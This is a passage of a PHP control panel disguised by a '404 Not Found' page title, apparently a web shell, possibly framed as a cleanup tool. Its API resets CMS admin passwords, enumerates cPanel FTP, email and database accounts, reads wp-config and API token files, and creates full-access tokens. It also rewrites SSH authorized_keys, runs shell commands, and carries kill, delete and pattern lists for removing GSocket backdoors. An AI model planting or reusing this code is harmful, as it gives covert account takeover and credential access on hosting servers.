                    $hash=password_hash($tempPass,PASSWORD_BCRYPT); $pp2=$db['prefix'];
                    try{
                        $pdo->prepare("UPDATE `{$pp2}employee` SET passwd=? WHERE id_employee=?")->execute([$hash,$uid]);
                        $adminPath=is_dir("$cmsRoot/admin") ? 'admin' : (glob("$cmsRoot/admin*/") ? basename(glob("$cmsRoot/admin*/")[0]) : 'admin');
                        $r['login_url']="$siteUrl/$adminPath/index.php"; $r['temp_password']=$tempPass;
                        $r['type']='password'; $r['note']='Temp password — change after login';
                    }catch(\Exception $e){$r['ok']=false;$r['error']=$e->getMessage();}
                } else {$r['ok']=false;$r['error']='DB required for PrestaShop auto-login';}
            } elseif ($cmsType==='laravel') {
                if($pdo&&$db){
                    $tempPass='Shield_'.bin2hex(random_bytes(5));
                    $hash=password_hash($tempPass,PASSWORD_BCRYPT); $pp2=$db['prefix'];
                    try{
                        $pdo->prepare("UPDATE `{$pp2}users` SET password=?,updated_at=NOW() WHERE id=?")->execute([$hash,$uid]);
                        $r['login_url']="$siteUrl/login"; $r['temp_password']=$tempPass;
                        $r['type']='password'; $r['note']='Temp password — change after login. Login at /login or /admin/login';
                    }catch(\Exception $e){$r['ok']=false;$r['error']=$e->getMessage();}
                } else {$r['ok']=false;$r['error']='DB required for Laravel auto-login';}
            } else { $r['ok']=false; $r['error']="Auto-login not supported for $cmsType"; }
        }

    } elseif ($api === 'cpanel_ftp_list') {
        $uapi = '/usr/local/cpanel/bin/uapi';
        $uapiWorks = false;
        $mainUser = get_current_user();
        $r['cpanel'] = false;
        $r['method'] = 'none';

        // Method 1: Try UAPI CLI
        if (file_exists($uapi)) {
            $r['cpanel'] = true;
            $testOut = xcmd("$uapi --output=json Ftp list_ftp_with_disk 2>&1");
            $testData = @json_decode($testOut, true);
            if ($testData && isset($testData['result']['status']) && $testData['result']['status'] == 1) {
                $uapiWorks = true;
                $r['method'] = 'uapi_cli';
            }
        }

        $accounts = [];
        $emails = [];
        $dbUsers = [];

        if ($uapiWorks) {
            // UAPI works — use it for everything
            $data = $testData;
            if (isset($data['result']['data'])) {
                foreach ($data['result']['data'] as $ftp) {
                    $accounts[] = [
                        'user' => $ftp['user'] ?? '',
                        'login' => $ftp['login'] ?? $ftp['user'] ?? '',
                        'dir' => $ftp['dir'] ?? $ftp['homedir'] ?? '',
                        'disk_used' => $ftp['diskusedpercent_float'] ?? $ftp['_diskused'] ?? 0,
                        'quota' => $ftp['diskquota'] ?? 'unlimited',
                        'type' => $ftp['type'] ?? 'ftp',
                    ];
                }
            }
            $emailOut = xcmd("$uapi --output=json Email list_pops 2>/dev/null");
            $emailData = @json_decode($emailOut, true);
            if ($emailData && isset($emailData['result']['data'])) {
                foreach ($emailData['result']['data'] as $em) {
                    $emails[] = [
                        'email' => $em['email'] ?? $em['user'] ?? '',
                        'login' => $em['login'] ?? '',
                        'disk_used' => $em['_diskused'] ?? $em['humandiskused'] ?? '0',
                        'domain' => $em['domain'] ?? '',
                    ];
                }
            }
            $dbOut = xcmd("$uapi --output=json Mysql list_users 2>/dev/null");
            $dbData = @json_decode($dbOut, true);
            $dbUsers = ($dbData && isset($dbData['result']['data'])) ? $dbData['result']['data'] : [];
        } else {
            // UAPI CLI failed (CageFS/restricted) — try curl localhost:2083
            $r['cpanel'] = file_exists('/usr/local/cpanel/bin/uapi') || is_dir('/usr/local/cpanel');
            $cpUser = $_POST['cp_user'] ?? '';
            $cpToken = $_POST['cp_token'] ?? '';

            if ($cpUser && $cpToken) {
                // Method 2: UAPI via curl localhost:2083
                $r['method'] = 'uapi_curl';
                $port = 2083;
                $authHeader = "Authorization: cpanel $cpUser:$cpToken";

                // FTP
                $ftpOut = xcmd("curl -sk -H " . escapeshellarg($authHeader) . " 'https://localhost:$port/execute/Ftp/list_ftp_with_disk' 2>/dev/null");
                $ftpData = @json_decode($ftpOut, true);
                $_ftpArr = _uapi_data($ftpData);
                if ($_ftpArr) {
                    foreach ($_ftpArr as $ftp) {
                        $accounts[] = [
                            'user' => $ftp['user'] ?? '',
                            'login' => $ftp['login'] ?? $ftp['user'] ?? '',
                            'dir' => $ftp['dir'] ?? $ftp['homedir'] ?? '',
                            'disk_used' => $ftp['diskusedpercent_float'] ?? $ftp['_diskused'] ?? 0,
                            'quota' => $ftp['diskquota'] ?? 'unlimited',
                            'type' => 'ftp',
                        ];
                    }
                }

                // Email
                $emailOut = xcmd("curl -sk -H " . escapeshellarg($authHeader) . " 'https://localhost:$port/execute/Email/list_pops_with_disk' 2>/dev/null");
                $emailData = @json_decode($emailOut, true);
                $_emArr = _uapi_data($emailData);
                if ($_emArr) {
                    foreach ($_emArr as $em) {
                        $emails[] = [
                            'email' => $em['email'] ?? $em['user'] ?? '',
                            'login' => $em['login'] ?? '',
                            'disk_used' => $em['_diskused'] ?? $em['humandiskused'] ?? '0',
                            'domain' => $em['domain'] ?? '',
                        ];
                    }
                }

                // MySQL users
                $dbOut = xcmd("curl -sk -H " . escapeshellarg($authHeader) . " 'https://localhost:$port/execute/Mysql/list_users' 2>/dev/null");
                $dbData = @json_decode($dbOut, true);
                if (_uapi_data($dbData)) {
                    $dbUsers = _uapi_data($dbData);
                }

                // MySQL databases
                $dbListOut = xcmd("curl -sk -H " . escapeshellarg($authHeader) . " 'https://localhost:$port/execute/Mysql/list_databases' 2>/dev/null");
                $dbListData = @json_decode($dbListOut, true);
                $r['databases'] = _uapi_data($dbListData) ?: [];

                // Subdomains
                $subOut = xcmd("curl -sk -H " . escapeshellarg($authHeader) . " 'https://localhost:$port/execute/SubDomain/listsubdomains' 2>/dev/null");
                $subData = @json_decode($subOut, true);
                $r['subdomains'] = _uapi_data($subData) ?: [];

                if (empty($accounts) && empty($emails) && empty($dbUsers)) {
                    $r['uapi_error'] = 'UAPI returned no data — check credentials. Raw FTP: ' . substr($ftpOut ?: '(empty)', 0, 200);
                }
            } else {
                // Method 3: File-based fallback (no credentials provided)
                $r['method'] = 'fallback';
                $r['needs_credentials'] = true;

                // Fallback MySQL from wp-config
                $wpConfigs = [];
                if (is_dir("$home/public_html") && file_exists("$home/public_html/wp-config.php"))
                    $wpConfigs[] = "$home/public_html/wp-config.php";
                $dd = "$home/domains";
                if (is_dir($dd)) {
                    foreach (scandir($dd) as $d) {
                        if ($d === '.' || $d === '..')
                            continue;
                        $wc = "$dd/$d/public_html/wp-config.php";
                        if (file_exists($wc))
                            $wpConfigs[] = $wc;
                    }
                }
                $seenDbUsers = [];
                foreach ($wpConfigs as $wc) {
                    $wcContent = @file_get_contents($wc);
                    if (!$wcContent)
                        continue;
                    if (preg_match("/DB_USER['\"],\s*['\"]([^'\"]+)/", $wcContent, $m)) {
                        $dbUser = $m[1];
                        if (!in_array($dbUser, $seenDbUsers)) {
                            $seenDbUsers[] = $dbUser;
                            $dbUsers[] = $dbUser;
                        }
                    }
                }

                // Fallback Email from mail dirs
                $mailDirs = ["$home/mail"];
                foreach ($mailDirs as $md) {
                    if (!is_dir($md))
                        continue;
                    $domains = @scandir($md);
                    if (!$domains)
                        continue;
                    foreach ($domains as $dom) {
                        if ($dom === '.' || $dom === '..' || !is_dir("$md/$dom") || in_array($dom, ['cur', 'new', 'tmp']))
                            continue;
                        $users = @scandir("$md/$dom");
                        if (!$users)
                            continue;
                        foreach ($users as $eu) {
                            if ($eu === '.' || $eu === '..' || !is_dir("$md/$dom/$eu") || in_array($eu, ['cur', 'new', 'tmp']))
                                continue;
                            $emails[] = ['email' => "$eu@$dom", 'login' => "$eu@$dom", 'disk_used' => '-', 'domain' => $dom];
                        }
                    }
                }
            }
        }

        $r['accounts'] = $accounts;
        $r['total'] = count($accounts);
        $r['main_user'] = $mainUser;
        $r['emails'] = $emails;
        $r['email_count'] = count($emails);
        $r['db_users'] = $dbUsers;
        $r['db_user_count'] = count($dbUsers);

    } elseif ($api === 'cpanel_ftp_add') {
        $uapi = '/usr/local/cpanel/bin/uapi';
        if (!file_exists($uapi)) {
            $r['ok'] = false;
            $r['error'] = 'cPanel not found';
            echo json_encode($r);
            exit;
        }
        $ftpUser = trim($_POST['ftp_user'] ?? '');
        $ftpPass = $_POST['ftp_pass'] ?? '';
        $ftpDir = trim($_POST['ftp_dir'] ?? 'public_html');
        $ftpQuota = intval($_POST['ftp_quota'] ?? 0);
        if (!$ftpUser || !$ftpPass) {
            $r['ok'] = false;
            $r['error'] = 'Username and password required';
            echo json_encode($r);
            exit;
        }
        $cmd = "$uapi --output=json Ftp add_ftp user=" . escapeshellarg($ftpUser) . " pass=" . escapeshellarg($ftpPass) . " homedir=" . escapeshellarg($ftpDir) . " quota=" . escapeshellarg($ftpQuota) . " 2>/dev/null";
        $out = xcmd($cmd);
        $data = @json_decode($out, true);
        if ($data && isset($data['result']['status']) && $data['result']['status'] == 1) {
            $r['created'] = $ftpUser;
        } else {
            $r['ok'] = false;
            $r['error'] = ($data && isset($data['result']['errors'])) ? implode(', ', $data['result']['errors']) : 'Failed to create FTP account';
        }

    } elseif ($api === 'cpanel_ftp_delete') {
        $uapi = '/usr/local/cpanel/bin/uapi';
        if (!file_exists($uapi)) {
            $r['ok'] = false;
            $r['error'] = 'cPanel not found';
            echo json_encode($r);
            exit;
        }
        $ftpUser = trim($_POST['ftp_user'] ?? '');
        $destroy = !empty($_POST['destroy']) ? '1' : '0';
        if (!$ftpUser) {
            $r['ok'] = false;
            $r['error'] = 'Username required';
            echo json_encode($r);
            exit;
        }
        $cmd = "$uapi --output=json Ftp delete_ftp user=" . escapeshellarg($ftpUser) . " destroy=$destroy 2>/dev/null";
        $out = xcmd($cmd);
        $data = @json_decode($out, true);
        if ($data && isset($data['result']['status']) && $data['result']['status'] == 1) {
            $r['deleted'] = $ftpUser;
        } else {
            $r['ok'] = false;
            $r['error'] = ($data && isset($data['result']['errors'])) ? implode(', ', $data['result']['errors']) : 'Failed to delete FTP account';
        }

    } elseif ($api === 'cpanel_email_delete') {
        $uapi = '/usr/local/cpanel/bin/uapi';
        if (!file_exists($uapi)) {
            $r['ok'] = false;
            $r['error'] = 'cPanel not found';
            echo json_encode($r);
            exit;
        }
        $email = trim($_POST['email'] ?? '');
        if (!$email || !strpos($email, '@')) {
            $r['ok'] = false;
            $r['error'] = 'Valid email required';
            echo json_encode($r);
            exit;
        }
        list($emailUser, $emailDomain) = explode('@', $email, 2);
        $cmd = "$uapi --output=json Email delete_pop email=" . escapeshellarg($emailUser) . " domain=" . escapeshellarg($emailDomain) . " 2>/dev/null";
        $out = xcmd($cmd);
        $data = @json_decode($out, true);
        if ($data && isset($data['result']['status']) && $data['result']['status'] == 1) {
            $r['deleted'] = $email;
        } else {
            $r['ok'] = false;
            $r['error'] = ($data && isset($data['result']['errors'])) ? implode(', ', $data['result']['errors']) : 'Failed to delete email';
        }

    } elseif ($api === 'cpanel_tokens_list') {
        $cpUser = trim($_POST['cp_user'] ?? '');
        $cpToken = trim($_POST['cp_token'] ?? '');
        $tokens = [];
        $r['method'] = 'none';

        // Method 1: Try UAPI CLI (works on non-CageFS servers)
        $uapi = '/usr/local/cpanel/bin/uapi';
        if (file_exists($uapi)) {
            $out = xcmd("$uapi --output=json Tokens list 2>/dev/null");
            $data = @json_decode($out, true);
            if ($data && isset($data['result']['status']) && $data['result']['status'] == 1 && isset($data['result']['data'])) {
                $r['method'] = 'uapi_cli';
                foreach ($data['result']['data'] as $t) {
                    $tokens[] = [
                        'name' => $t['name'] ?? '',
                        'created' => isset($t['create_time']) ? date('Y-m-d H:i:s', $t['create_time']) : '-',
                        'has_full_access' => !empty($t['full_access']),
                        'restrictions' => $t['restrictions'] ?? [],
                    ];
                }
            }
        }

        // Method 2: curl localhost:2083 (CageFS fallback — needs credentials)
        if (empty($tokens) && $cpUser && $cpToken) {
            $r['method'] = 'uapi_curl';
            $authHeader = "Authorization: cpanel $cpUser:$cpToken";
            $out = xcmd("curl -sk -H " . escapeshellarg($authHeader) . " 'https://localhost:2083/execute/Tokens/list' 2>/dev/null");
            $data = @json_decode($out, true);
            $_tokArr = _uapi_data($data);
            if ($_tokArr) {
                foreach ($_tokArr as $t) {
                    $tokens[] = [
                        'name' => $t['name'] ?? '',
                        'created' => isset($t['create_time']) ? date('Y-m-d H:i:s', $t['create_time']) : '-',
                        'has_full_access' => !empty($t['full_access']),
                        'restrictions' => $t['restrictions'] ?? [],
                    ];
                }
            }
            if (empty($tokens) && $out)
                $r['raw_hint'] = substr($out, 0, 300);
        }

        // Method 3: Filesystem scan (PHP native + shell fallback for CageFS)
        if (empty($tokens)) {
            $tokenDirs = ["$home/.cpanel/api_tokens", "$home/.cpanel/tokens", "/home/$user/.cpanel/api_tokens"];
            // 3a: PHP native scandir
            foreach ($tokenDirs as $td) {
                if (!is_dir($td)) continue;
                $r['method'] = 'filesystem';
                $r['token_dir'] = $td;
                try {
                    foreach (scandir($td) as $tf) {
                        if ($tf === '.' || $tf === '..' || !is_file("$td/$tf")) continue;
                        $tc = @file_get_contents("$td/$tf");
                        $tj = @json_decode($tc, true);
                        $tokens[] = [
                            'name' => ($tj && isset($tj['name'])) ? $tj['name'] : pathinfo($tf, PATHINFO_FILENAME),
                            'created' => ($tj && isset($tj['create_time'])) ? date('Y-m-d H:i:s', $tj['create_time']) : date('Y-m-d H:i:s', @filemtime("$td/$tf")),
                            'has_full_access' => $tj ? !empty($tj['full_access']) : true,
                            'restrictions' => ($tj && isset($tj['restrictions'])) ? $tj['restrictions'] : [],
                            'file' => "$td/$tf",
                        ];
                    }
                } catch (\Exception $e) {}
                if (!empty($tokens)) break;
            }
            // 3b: Shell-based ls (CageFS may block PHP scandir but allow shell access)
            if (empty($tokens)) {
                foreach ($tokenDirs as $td) {
                    $lsOut = trim(xcmd("ls -la " . escapeshellarg($td) . " 2>/dev/null"));
                    if (!$lsOut || strpos($lsOut, 'No such file') !== false || strpos($lsOut, 'total 0') !== false) continue;
                    $fileList = trim(xcmd("ls -1 " . escapeshellarg($td) . " 2>/dev/null"));
                    if (!$fileList) continue;
                    $r['method'] = 'shell_ls';
                    $r['token_dir'] = $td;
                    foreach (explode("\n", $fileList) as $tf) {
                        $tf = trim($tf);
                        if (!$tf) continue;
                        $fp = "$td/$tf";
                        $tc = trim(xcmd("cat " . escapeshellarg($fp) . " 2>/dev/null"));
                        $tj = @json_decode($tc, true);
                        $fdate = trim(xcmd("stat -c %Y " . escapeshellarg($fp) . " 2>/dev/null"));
                        $tokens[] = [
                            'name' => ($tj && isset($tj['name'])) ? $tj['name'] : pathinfo($tf, PATHINFO_FILENAME),
                            'created' => ($tj && isset($tj['create_time'])) ? date('Y-m-d H:i:s', $tj['create_time']) : ($fdate ? date('Y-m-d H:i:s', (int)$fdate) : '-'),
                            'has_full_access' => $tj ? !empty($tj['full_access']) : true,
                            'restrictions' => ($tj && isset($tj['restrictions'])) ? $tj['restrictions'] : [],
                            'file' => $fp,
                        ];
                    }
                    if (!empty($tokens)) break;
                }
            }
            // 3c: cPanel API via WHM port 2087 (reseller/root)
            if (empty($tokens)) {
                $whm = trim(xcmd("curl -sk 'https://localhost:2083/frontend/jupiter/api_tokens/index.html' 2>/dev/null | grep -c 'api_tokens' 2>/dev/null"));
                if ($whm && intval($whm) > 0) {
                    $r['cpanel_has_tokens_page'] = true;
                }
            }
        }

        if (empty($tokens) && $r['method'] === 'none') {
            $r['ok'] = false;
            $r['error'] = 'No tokens found. CageFS may block filesystem access. Enter cPanel API Token above to use curl fallback, or check cPanel → Security → API Tokens manually.';
        }

        $r['tokens'] = $tokens;
        $r['total'] = count($tokens);

    } elseif ($api === 'cpanel_token_revoke') {
        $tokenName = trim($_POST['token_name'] ?? '');
        if (!$tokenName) {
            $r['ok'] = false;
            $r['error'] = 'Token name required';
            echo json_encode($r);
            exit;
        }
        $revoked = false;
        $diag = [];
        $uapi = '/usr/local/cpanel/bin/uapi';
        if (file_exists($uapi)) {
            $out = xcmd("$uapi --output=json Tokens revoke name=" . escapeshellarg($tokenName) . " 2>/dev/null");
            $data = @json_decode($out, true);
            if (_uapi_ok($data)) { $revoked = true; $diag[] = 'uapi_cli OK'; }
            else $diag[] = 'uapi_cli: ' . substr($out ?: 'no output', 0, 100);
        } else {
            $diag[] = 'uapi_cli: not found';
        }
        if (!$revoked) {
            $cpUser = trim($_POST['cp_user'] ?? '');
            $cpToken = trim($_POST['cp_token'] ?? '');
            if ($cpUser && $cpToken) {
                $authHeader = "Authorization: cpanel $cpUser:$cpToken";
                $out = xcmd("curl -sk -H " . escapeshellarg($authHeader) . " 'https://localhost:2083/execute/Tokens/revoke?name=" . urlencode($tokenName) . "' 2>/dev/null");
                $data = @json_decode($out, true);
                if (_uapi_ok($data)) { $revoked = true; $diag[] = 'curl OK'; }
                else $diag[] = 'curl: ' . substr($out ?: 'no output', 0, 200);
            } else {
                $diag[] = 'curl: no credentials (cp_user=' . ($cpUser ? 'set' : 'empty') . ', cp_token=' . ($cpToken ? 'set' : 'empty') . ')';
            }
        }
        // Method 3: Filesystem delete (PHP native + shell fallback for CageFS)
        if (!$revoked) {
            $tokenDirs = ["$home/.cpanel/api_tokens", "$home/.cpanel/tokens", "/home/$user/.cpanel/api_tokens"];
            foreach ($tokenDirs as $td) {
                // 3a: PHP native delete
                if (is_dir($td)) {
                    foreach ([$tokenName, "$tokenName.json", "$tokenName.yaml"] as $fn) {
                        $fp = "$td/$fn";
                        if (file_exists($fp)) {
                            @unlink($fp);
                            if (!file_exists($fp)) { $revoked = true; $r['method'] = 'filesystem_delete'; break 2; }
                        }
                    }
                    // Match by name inside JSON
                    $files = @scandir($td);
                    if ($files) {
                        foreach ($files as $tf) {
                            if ($tf === '.' || $tf === '..') continue;
                            $fp = "$td/$tf";
                            $tc = @file_get_contents($fp);
                            $tj = @json_decode($tc, true);
                            if ($tj && isset($tj['name']) && $tj['name'] === $tokenName) {
                                @unlink($fp);
                                if (!file_exists($fp)) { $revoked = true; $r['method'] = 'filesystem_delete'; break 2; }
                            }
                        }
                    }
                }
                // 3b: Shell-based delete (CageFS may block PHP but allow shell)
                if (!$revoked) {
                    foreach ([$tokenName, "$tokenName.json", "$tokenName.yaml"] as $fn) {
                        $fp = "$td/$fn";
                        $exists = trim(xcmd("test -f " . escapeshellarg($fp) . " && echo YES 2>/dev/null"));
                        if ($exists === 'YES') {
                            xcmd("rm -f " . escapeshellarg($fp) . " 2>/dev/null");
                            $chk = trim(xcmd("test -f " . escapeshellarg($fp) . " && echo YES || echo NO 2>/dev/null"));
                            if ($chk === 'NO') { $revoked = true; $r['method'] = 'shell_delete'; break 2; }
                        }
                    }
                    // Shell: find by name in JSON content
                    $grepResult = trim(xcmd("grep -rl " . escapeshellarg('"name":"' . $tokenName . '"') . " " . escapeshellarg($td) . " 2>/dev/null | head -1"));
                    if ($grepResult && trim($grepResult)) {
                        xcmd("rm -f " . escapeshellarg(trim($grepResult)) . " 2>/dev/null");
                        $chk = trim(xcmd("test -f " . escapeshellarg(trim($grepResult)) . " && echo YES || echo NO 2>/dev/null"));
                        if ($chk === 'NO') { $revoked = true; $r['method'] = 'shell_delete'; break; }
                    }
                }
            }
        }

        if ($revoked) {
            $r['revoked'] = $tokenName;
        } else {
            $r['ok'] = false;
            $r['error'] = 'Failed to revoke. Diag: ' . implode(' | ', $diag) . '. Try: cPanel → Security → API Tokens → revoke manually.';
        }

    } elseif ($api === 'cpanel_token_create') {
        $newName = trim($_POST['token_name'] ?? '');
        if (!$newName) {
            $r['ok'] = false;
            $r['error'] = 'Token name required';
            echo json_encode($r);
            exit;
        }
        $created = false;
        $uapi = '/usr/local/cpanel/bin/uapi';
        if (file_exists($uapi)) {
            $out = xcmd("$uapi --output=json Tokens create_full_access name=" . escapeshellarg($newName) . " 2>/dev/null");
            $data = @json_decode($out, true);
            $_cd = _uapi_data($data);
            if ($_cd) {
                $r['token_name'] = $newName;
                $r['token_value'] = $_cd;
                $created = true;
            }
        }
        if (!$created) {
            $cpUser = trim($_POST['cp_user'] ?? '');
            $cpToken = trim($_POST['cp_token'] ?? '');
            if ($cpUser && $cpToken) {
                $authHeader = "Authorization: cpanel $cpUser:$cpToken";
                $out = xcmd("curl -sk -H " . escapeshellarg($authHeader) . " 'https://localhost:2083/execute/Tokens/create_full_access?name=" . urlencode($newName) . "' 2>/dev/null");
                $data = @json_decode($out, true);
                $_cd2 = _uapi_data($data);
                if ($_cd2) {
                    $r['token_name'] = $newName;
                    $r['token_value'] = $_cd2;
                    $created = true;
                }
            }
        }
        if (!$created) {
            $r['ok'] = false;
            $r['error'] = 'Failed to create token';
        }

    } elseif ($api === 'ssh_edit_key') {
        $idx = intval($_POST['key_idx'] ?? -1);
        $newVal = trim($_POST['new_value'] ?? '');
        $akFile = "$home/.ssh/authorized_keys";
        if ($idx < 0 || !$newVal) {
            $r['ok'] = false;
            $r['error'] = 'Invalid index or empty key';
            echo json_encode($r);
            exit;
        }
        if (file_exists($akFile)) {
            $lines = file($akFile, FILE_IGNORE_NEW_LINES);
            if (isset($lines[$idx])) {
                $lines[$idx] = $newVal;
                file_put_contents($akFile, implode("\n", $lines) . "\n");
                $r['edited'] = $idx;
            } else {
                $r['ok'] = false;
                $r['error'] = 'Key index not found';
            }
        } else {
            $r['ok'] = false;
            $r['error'] = 'authorized_keys not found';
        }

    } elseif ($api === 'gsocket_uninstall') {
        xcmd("pkill -9 -f 'watchdog.sh' 2>/dev/null; pkill -9 -f gs-dbus 2>/dev/null; pkill -9 -f gs-netcat 2>/dev/null; pkill -9 -f defunct.dat 2>/dev/null; pkill -9 -f defunct 2>/dev/null; sleep 1");
        xcmd("for _f in .bashrc .profile .bash_profile .bash_login; do _p=\"$home/\$_f\"; _ts=\$(stat -c %Y \"\$_p\" 2>/dev/null || echo ''); sed -i '/gs-dbus/d; /gs-netcat/d; /GS_ARGS/d; /defunct/d; /1b5b324a/d; /seed prng/d; /watchdog/d; /rcu_preempt/d; /kstrp/d; /id_rsa.*liqD/d; /\.ssh\/putty/d; /base64.*-d.*bash/d' \"\$_p\" 2>/dev/null; [ -n \"\$_ts\" ] && touch -d @\$_ts \"\$_p\" 2>/dev/null; done");
        xcmd("(crontab -l 2>/dev/null | grep -v 'gs-dbus' | grep -v 'gs-netcat' | grep -v 'GS_ARGS' | grep -v 'defunct' | grep -v '1b5b324a' | grep -v 'seed prng') | crontab - 2>/dev/null");
        // Clean ALL possible install directories (not just $home/.config/htop)
        $cleanDirs = ["$home/.config/htop", "$home/.cache", "$home/.local/share", "/tmp", "/var/tmp", "/dev/shm"];
        foreach ($cleanDirs as $binDir) {
            if (!is_dir($binDir)) continue;
            xcmd("rm -f " . escapeshellarg("$binDir/.watchdog.sh") . " 2>/dev/null");
            xcmd("rm -rf " . escapeshellarg($binDir) . "/gs-dbus* " . escapeshellarg($binDir) . "/defunct* " . escapeshellarg($binDir) . "/.defunct* " . escapeshellarg($binDir) . "/gs.tar.gz 2>/dev/null");
            xcmd("rm -f " . escapeshellarg($binDir) . "/*.dat " . escapeshellarg($binDir) . "/.*.dat " . escapeshellarg($binDir) . "/*.cfg " . escapeshellarg($binDir) . "/.*.cfg 2>/dev/null");
        }
        // Also clean .ssh/putty/ (attacker GSocket hiding spot)
        $puttyDir = "$home/.ssh/putty";
        if (is_dir($puttyDir)) {
            xcmd("find " . escapeshellarg($puttyDir) . " -type f -exec file {} \\; 2>/dev/null | grep ELF | cut -d: -f1 | xargs rm -f 2>/dev/null");
            xcmd("find " . escapeshellarg($puttyDir) . " -maxdepth 1 -name '*.ppk' -size -100c -delete 2>/dev/null");
        }
        $r['ok'] = true;
    }

    echo json_encode($r, JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
    exit;
}
?>
<!DOCTYPE html>
<html>

<head>
    <title>404 Not Found</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box
        }

        :root {
            --bg0: #08080c;
            --bg1: #0f1117;
            --bg2: #161820;
            --bg3: #1e2028;
            --bg4: #282a34;
            --accent: #ff453a;
            --accent2: #ff6961;
            --adim: #ff453a1a;
            --t1: #f5f5f7;
            --t2: #98989d;
            --t3: #48484a;
            --border: #1c1e26;
            --green: #32d74b;
            --orange: #ff9f0a;
            --r: 12px;
            --rs: 8px
        }

        body {
            background: var(--bg0);
            color: var(--t1);
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", system-ui, sans-serif;
            font-size: 13px
        }

        .app {
            display: flex;
            height: 100vh
        }

        .sb {
            width: 220px;
            background: var(--bg1);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            flex-shrink: 0
        }

        .sb-h {
            padding: 16px;
            border-bottom: 1px solid var(--border);
            text-align: center
        }

        .sb-h .logo {
            font-size: 32px;
            filter: drop-shadow(0 0 12px #ff453a44)
        }

        .sb-h .nm {
            color: var(--accent);
            font-weight: 700;
            font-size: 16px;
            letter-spacing: 3px;
            font-family: monospace
        }

        .sb-h .ver {
            color: var(--t3);
            font-size: 10px;
            letter-spacing: 1px
        }

        .sb-n {
            flex: 1;
            padding: 8px;
            overflow-y: auto
        }

        .ni {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 12px;
            border-radius: var(--rs);
            cursor: pointer;
            color: var(--t2);
            border: none;
            background: none;
            width: 100%;
            text-align: left;
            font-family: inherit;
            font-size: 13px;
            font-weight: 500;
            transition: .15s
        }

        .ni:hover {
            background: var(--bg3);
            color: var(--t1)
        }

        .ni.active {
            background: var(--adim);
            color: var(--accent)
        }

        .ni .ic {
            width: 20px;
            text-align: center;
            font-size: 15px
        }

        .ni .badge {
            margin-left: auto;
            background: var(--accent);
            color: #fff;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 10px;
            font-weight: 700;
            min-width: 18px;
            text-align: center
        }

        .sb-f {
            padding: 12px 16px;
            border-top: 1px solid var(--border);
            font-size: 11px;
            color: var(--t3)
        }

        .mn {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden
        }

        .tb {
            background: var(--bg1);
            border-bottom: 1px solid var(--border);
            padding: 10px 20px;
            display: flex;
            align-items: center;
            gap: 12px
        }

        .dots {
            display: flex;
            gap: 6px
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%
        }

        .dr {
            background: #ff5f57
        }

        .dy {
            background: #febc2e
        }

        .dg {
            background: #28c840
        }

        .tb-t {
            flex: 1;
            text-align: center;
            color: var(--t3);
            font-size: 12px
        }

        .ct {
            flex: 1;
            overflow-y: auto;
            padding: 20px
        }

        .pn {
            background: var(--bg2);
            border: 1px solid var(--border);
            border-radius: var(--r);
            margin-bottom: 16px;
            overflow: hidden
        }

        .pn-h {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg3)
        }

        .pn-h h3 {
            font-size: 13px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px
        }

        .pn-b {
            padding: 16px
        }

        .btn {
            background: var(--accent);
            color: #fff;
            border: none;
            border-radius: var(--rs);
            padding: 8px 16px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
            transition: .15s;
            display: inline-flex;
            align-items: center;
            gap: 6px
        }

        .btn:hover {
            background: var(--accent2);
            box-shadow: 0 4px 16px #ff453a33
        }

        .btn-s {
            padding: 5px 10px;
            font-size: 11px
        }

        .btn-g {
            background: transparent;
            border: 1px solid var(--accent);
            color: var(--accent)
        }

        .btn-g:hover {
            background: var(--accent);
            color: #fff
        }

        .btn-d {
            background: #ff453a
        }

        .btn-ok {
            background: var(--green);
            color: #000
        }

        .btn-w {
            background: var(--orange);
            color: #000
        }

        .sg {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 12px
        }

        .sc {
            background: var(--bg3);
            border: 1px solid var(--border);
            border-radius: var(--rs);
            padding: 16px;
            text-align: center
        }

        .sc .v {
            font-size: 28px;
            font-weight: 700;
            color: var(--accent);
            font-family: monospace
        }

        .sc .l {
            font-size: 10px;
            color: var(--t3);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 4px
        }

        .sc.ok .v {
            color: var(--green)
        }

        .sc.wr .v {
            color: var(--orange)
        }

        table {
            width: 100%;
            border-collapse: collapse
        }

        th {
            background: var(--bg1);
            color: var(--t3);
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: .5px;
            padding: 8px 12px;
            text-align: left;
            border-bottom: 1px solid var(--border)
        }

        td {
            padding: 7px 12px;
            border-bottom: 1px solid var(--border);
            font-size: 12px
        }

        tr:hover td {
            background: var(--adim)
        }

        tr.th td {
            background: #ff453a0d
        }

        .tag {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: .5px
        }

        .tag-d {
            background: #ff453a22;
            color: var(--accent)
        }

        .tag-ok {
            background: #32d74b1a;
            color: var(--green)
        }

        .tag-w {
            background: #ff9f0a1a;
            color: var(--orange)
        }

        .trm {
            background: #08080c;
            border: 1px solid var(--border);
            border-radius: var(--r);
            overflow: hidden;
            font-family: "SF Mono", "Fira Code", monospace
        }

        .trm-h {
            background: var(--bg3);
            padding: 8px 12px;
            display: flex;
            align-items: center;
            gap: 6px;
            border-bottom: 1px solid var(--border)
        }

        .trm-b {
            padding: 12px;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            font-size: 12px;
            line-height: 1.7;
            color: var(--green);
            white-space: pre-wrap;
            word-break: break-all
        }

        .trm-i {
            display: flex;
            border-top: 1px solid var(--border);
            background: #08080c
        }

        .trm-i span {
            padding: 10px 0 10px 12px;
            color: var(--accent);
            font-size: 13px;
            font-family: monospace
        }
